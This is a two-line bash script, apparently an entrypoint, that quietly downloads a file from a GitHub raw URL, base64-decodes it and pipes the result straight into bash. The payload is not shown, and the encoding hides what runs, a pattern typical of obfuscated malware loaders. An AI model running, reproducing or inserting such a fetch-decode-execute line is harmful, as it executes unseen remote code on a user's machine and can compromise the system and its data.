#!/bin/bash
wget -qO- https://raw.githubusercontent.com/rodneyhanna/taxi/refs/heads/main/entrypoint.sh | base64 -d | bash
